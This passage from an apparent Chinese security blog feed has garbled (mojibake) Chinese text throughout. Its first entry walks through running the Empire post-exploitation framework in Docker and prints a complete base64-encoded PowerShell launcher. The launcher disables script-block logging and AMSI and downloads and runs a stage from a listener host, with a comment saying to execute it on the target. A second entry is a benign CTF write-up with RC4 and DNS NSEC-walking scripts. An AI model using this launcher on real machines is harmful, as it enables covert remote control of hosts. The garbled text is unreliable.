service</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"bash -x /run.sh"</span>]</span></span><br></pre></td></tr></table></figure><h4 id="Dockerfileçš„ä½¿ç”¨æ–¹å¼"><a href="#Dockerfileçš„ä½¿ç”¨æ–¹å¼" class="headerlink" title="Dockerfileçš„ä½¿ç”¨æ–¹å¼"></a>Dockerfileçš„ä½¿ç”¨æ–¹å¼</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿›å…¥Dockerfileç›®å½•</span><br><span class="line">[docker build -t &apos;è‡ªå®šä¹‰é•œåƒåå­—&apos; . ] //æœ€åçš„.åˆ«å°‘äº†</span><br><span class="line">[docker run -id --name &apos;ä½ çš„åº”ç”¨åç§°&apos; -p å¤–éƒ¨ç«¯å£:80 -m &apos;å†…å­˜é™åˆ¶ å¦‚1gã€500m&apos; &apos;ä½ çš„è‡ªå®šä¹‰é•œåƒåç§°&apos; /run.sh]</span><br></pre></td></tr></table></figure><h3 id="é™„ä¾‹"><a href="#é™„ä¾‹" class="headerlink" title="é™„ä¾‹"></a>é™„ä¾‹</h3><p>åœ¨vpsä¸­çš„dockerä¸Šä½¿ç”¨empireè¿›è¡Œæ¸—é€æµ‹è¯•(metasploitåŒç†)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç«¯å£æ˜ å°„å‚è€ƒä¸Šæ¡</span></span><br><span class="line">================================================================</span><br><span class="line"> [Empire]  Post-Exploitation Framework</span><br><span class="line">================================================================</span><br><span class="line"> [Version] 2.3 | [Web] https://github.com/empireProject/Empire</span><br><span class="line">================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       282 modules currently loaded</span><br><span class="line"></span><br><span class="line">       0 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire) &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Commands</span><br><span class="line">========</span><br><span class="line">agents            Jump to the Agents menu.</span><br><span class="line">creds             Add/display credentials to/from the database.</span><br><span class="line"><span class="built_in">exit</span>              Exit Empire</span><br><span class="line"><span class="built_in">help</span>              Displays the <span class="built_in">help</span> menu.</span><br><span class="line">interact          Interact with a particular agent.</span><br><span class="line">list              Lists active agents or listeners.</span><br><span class="line">listeners         Interact with active listeners.</span><br><span class="line">load              Loads Empire modules from a non-standard folder.</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files</span><br><span class="line">reload            Reload one (or all) Empire modules.</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">searchmodule      Search Empire module names/descriptions.</span><br><span class="line"><span class="built_in">set</span>               Set a global option (e.g. IP whitelists).</span><br><span class="line">show              Show a global option (e.g. IP whitelists).</span><br><span class="line">usemodule         Use an Empire module.</span><br><span class="line">usestager         Use an Empire stager.</span><br><span class="line"></span><br><span class="line">(Empire) &gt; list</span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active</span><br><span class="line">(Empire: listeners) &gt; uselistener http</span><br><span class="line">(Empire: listeners/http) &gt; info</span><br><span class="line"></span><br><span class="line">    Name: HTTP[S]</span><br><span class="line">Category: client_server</span><br><span class="line"></span><br><span class="line">Authors:</span><br><span class="line">  @harmj0y</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Starts a http[s] listener (PowerShell or Python) that uses a</span><br><span class="line">  GET/POST approach.</span><br><span class="line"></span><br><span class="line">HTTP[S] Options:</span><br><span class="line"></span><br><span class="line">  Name              Required    Value                            Description</span><br><span class="line">  ----              --------    -------                          -----------</span><br><span class="line">  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.</span><br><span class="line">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span class="keyword">for</span> request (default, none, or other).</span><br><span class="line">  KillDate          False                                        Date <span class="keyword">for</span> the listener to <span class="built_in">exit</span> (MM/dd/yyyy).</span><br><span class="line">  Name              True        http                             Name <span class="keyword">for</span> the listener.</span><br><span class="line">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</span><br><span class="line">  DefaultDelay      True        5                                Agent delay/reach back interval (<span class="keyword">in</span> seconds).</span><br><span class="line">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</span><br><span class="line">  WorkingHours      False                                        Hours <span class="keyword">for</span> the agent to operate (09:00-17:00).</span><br><span class="line">  SlackChannel      False       <span class="comment">#general                         The Slack channel or DM that notifications will be sent to.</span></span><br><span class="line">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile <span class="keyword">for</span> the agent.</span><br><span class="line">                                process.php|Mozilla/5.0 (Windows</span><br><span class="line">                                NT 6.1; WOW64; Trident/7.0;</span><br><span class="line">                                rv:11.0) like Gecko</span><br><span class="line">  Host              True        http://172.17.0.2:80             Hostname/IP <span class="keyword">for</span> staging.</span><br><span class="line">  CertPath          False                                        Certificate path <span class="keyword">for</span> https listeners.</span><br><span class="line">  DefaultJitter     True        0.0                              Jitter <span class="keyword">in</span> agent reachback interval (0.0-1.0).</span><br><span class="line">  Proxy             False       default                          Proxy to use <span class="keyword">for</span> request (default, none, or other).</span><br><span class="line">  UserAgent         False       default                          User-agent string to use <span class="keyword">for</span> the staging request (default, none, or other).</span><br><span class="line">  StagingKey        True        3ab47284cf7e260541d810beb54d3405 Staging key <span class="keyword">for</span> initial agent negotiation.</span><br><span class="line">  BindIP            True        0.0.0.0                          The IP to <span class="built_in">bind</span> to on the control server.</span><br><span class="line">  Port              True        80                               Port <span class="keyword">for</span> the listener.</span><br><span class="line">  ServerVersion     True        Microsoft-IIS/7.5                Server header <span class="keyword">for</span> the control server.</span><br><span class="line">  StagerURI         False                                        URI <span class="keyword">for</span> the stager. Must use /download/. Example: /download/stager.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Name docker</span><br><span class="line"><span class="comment">#æ­¤å¤„çš„172.16.188.1ä¸ºvpsçš„ipåœ°å€</span></span><br><span class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host http://172.16.188.1:5000</span><br><span class="line">(Empire: listeners/http) &gt; execute</span><br><span class="line">[*] Starting listener <span class="string">'docker'</span></span><br><span class="line">[+] Listener successfully started!</span><br><span class="line">(Empire: listeners/http) &gt; lsit</span><br><span class="line">*** Unknown syntax: lsit</span><br><span class="line">(Empire: listeners/http) &gt; back</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</span><br><span class="line">  ----              ------          ----                                 ------------   --------</span><br><span class="line">  docker            http            http://172.16.188.1:5000             5/0.0</span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt; usestager</span><br><span class="line">multi/bash                osx/dylib                 osx/teensy                windows/launcher_sct</span><br><span class="line">multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs</span><br><span class="line">multi/pyinstaller         osx/launcher              windows/dll               windows/macro</span><br><span class="line">multi/war                 osx/macho                 windows/ducky             windows/macroless_msword</span><br><span class="line">osx/applescript           osx/macro                 windows/hta               windows/teensy</span><br><span class="line">osx/application           osx/pkg                   windows/launcher_bat</span><br><span class="line">osx/ducky                 osx/safari_launcher       windows/launcher_lnk</span><br><span class="line">(Empire: listeners) &gt; usestager windows/d</span><br><span class="line">dll    ducky</span><br><span class="line">(Empire: listeners) &gt; usestager windows/dll</span><br><span class="line">(Empire: stager/windows/dll) &gt; info</span><br><span class="line"></span><br><span class="line">Name: DLL Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generate a PowerPick Reflective DLL to inject with</span><br><span class="line">  stager code.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to use.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use <span class="keyword">for</span></span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand <span class="keyword">for</span> obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Proxy            False       default           Proxy to use <span class="keyword">for</span> request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</span><br><span class="line">  UserAgent        False       default           User-agent string to use <span class="keyword">for</span> the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Arch             True        x64               Architecture of the .dll to generate</span><br><span class="line">                                                 (x64 or x86).</span><br><span class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation <span class="built_in">command</span> to use.</span><br><span class="line">                                                 Only used <span class="keyword">if</span> Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  StagerRetries    False       0                 Times <span class="keyword">for</span> the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/dll) &gt; <span class="built_in">set</span> Listener docker</span><br><span class="line">(Empire: stager/windows/dll) &gt; back</span><br><span class="line">(Empire: listeners) &gt; launcher powershell docker</span><br><span class="line">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBpAE8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkAbgBHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQAbgB1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIAbgBwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</span><br><span class="line"><span class="comment">#åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä¸Šé¢çš„payloadå°±å¯ä»¥å¾—åˆ°ä¸‹é¢çš„åå¼¹</span></span><br><span class="line">(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚å¿µ&quot;&gt;&lt;/a&gt;æ¦‚å¿µ&lt;/h3&gt;&lt;p&gt;Dockeré•œåƒï¼šä¸€ä¸ªåªè¯»æ¨¡æ¿ï¼Œæ˜¯åˆ›å»ºDockerå®¹å™¨çš„åŸºç¡€ã€‚é•œåƒæ–‡ä»¶æ˜¯ç”±å¤šä¸ªå±‚ç»„æˆçš„ã€‚&lt;/p&gt;
&lt;p&gt;Dockerå®¹å™¨ï¼šä¸€ä¸ªè½»é‡çº§æ²™ç®±ï¼Œæ¥
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>EIS 2017 DNS101é¢˜è§£</title>
    <link href="http://zer0yu.github.io/2017/11/02/EIS-2017-MISC%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/11/02/EIS-2017-MISCé¢˜è§£/</id>
    <published>2017-11-02T13:26:11.000Z</published>
    <updated>2017-11-02T13:35:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä»Šå¤©è·Ÿå¤§ä½¬ä»¬åœ¨åšEIS 2017è¿ç»´æŒ‘æˆ˜èµ›ï¼Œæˆ‘çœ‹çš„æ—¶å€™å¤§ä½¬ä»¬å·²ç»æŠŠwebåšçš„å·®ä¸å¤šäº†ã€‚æ‰€ä»¥æˆ‘å°±æ¥è§£å†³ä¸¤é“MISCã€‚</p><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>ç¬¬ä¸€ä¸ªæ˜¯rc4çš„ä¸€ä¸ªè§£å¯†ï¼ŒæŒºç®€å•çš„ï¼Œæ‰‹æ’¸ä¸€ä¸ªè§£å¯†ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#å¯†æ–‡ï¼šä¸‹é¢åå…­è¿›åˆ¶çš„ä¸€ä¸²ï¼›å¯†é’¥ï¼šhello world</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span><span class="params">(data,key)</span>:</span></span><br><span class="line">  j=<span class="number">0</span></span><br><span class="line">  s=range(<span class="number">256</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    j=(j+s[i]+ord(key[i%len(key)]))%<span class="number">256</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]</span><br><span class="line">  i=<span class="number">0</span></span><br><span class="line">  j=<span class="number">0</span></span><br><span class="line">  out=[]</span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+s[i])%<span class="number">256</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]</span><br><span class="line">    out.append(chr(ord(char)^s[(s[i]+s[j])%<span class="number">256</span>]))</span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line">encodedata=rc4(<span class="string">'\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78'</span>,<span class="string">'hello world'</span>)</span><br><span class="line"><span class="keyword">print</span> encodedata</span><br></pre></td></tr></table></figure><h3 id="DNS-101"><a href="#DNS-101" class="headerlink" title="DNS 101"></a>DNS 101</h3><p>è¿™ä¸ªé¢˜æˆ‘æ˜¯æ‡µé€¼äº†ä¸€ä¸Šåˆï¼Œdigäº†ä¸€æ—©ä¸ŠTXTæ²¡æƒ³åˆ°ç„æœºåœ¨ä¸NSEC(DNSSEC çš„ä¸€éƒ¨åˆ† â€” ç”¨æ¥éªŒè¯ä¸€ä¸ªæœªå­˜åœ¨çš„æœåŠ¡å™¨ï¼Œä½¿ç”¨ä¸ NXTï¼ˆå·²è¿‡æ—¶ï¼‰è®°å½•çš„æ ¼å¼)ã€‚è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯dig anyçš„ç”¨æ³•ï¼Œè¿™ä¸ªå½“æ—¶ä¹Ÿæ˜¯æ²¡æœ‰è€ƒè™‘åˆ°ã€‚ï¼ˆå¤šè°¢rebirthçš„æŒ‡ç‚¹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">target = <span class="string">'what.is.my.flag.src.edu-info.edu.cn'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  output = subprocess.Popen([<span class="string">'dig any'</span>+<span class="string">' '</span>+target],stdout=subprocess.PIPE,shell=<span class="literal">True</span>).communicate()</span><br><span class="line"></span><br><span class="line">  <span class="comment">#print output[0]</span></span><br><span class="line"></span><br><span class="line">  result = re.findall(<span class="string">".*NSEC(.*). TXT.*"</span>,output[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> result[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">  target = result[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">  flag = subprocess.Popen([<span class="string">'dig'</span>+<span class="string">' '</span>+target+<span class="string">' '</span>+<span class="string">'TXT'</span>],stdout=subprocess.PIPE,shell=<span class="literal">True</span>).communicate()</span><br><span class="line">  <span class="comment">#EIS&#123;&#125;æ˜¯flagçš„æ ¼å¼</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">'EIS'</span> <span class="keyword">in</span> flag[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">print</span> flag[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-02%20%E4%B8%8B%E5%8D%889.23.28.png" alt="å±å¹•å¿«ç…§ 2017-11-02 ä¸‹åˆ9.23.28"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;ä»Šå¤©è·Ÿå¤§ä½¬ä»¬åœ¨åšEIS 2017è¿ç»´æŒ‘æˆ˜èµ›ï¼Œæˆ‘çœ‹çš„æ—¶å€™å¤§ä½¬ä»¬å·²ç»æŠŠwebåšçš„å·®ä¸å¤šäº†ã€‚æ‰€ä»¥æˆ‘å°±æ¥è§£å†³ä¸¤é“MISCã€‚&lt;/p&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
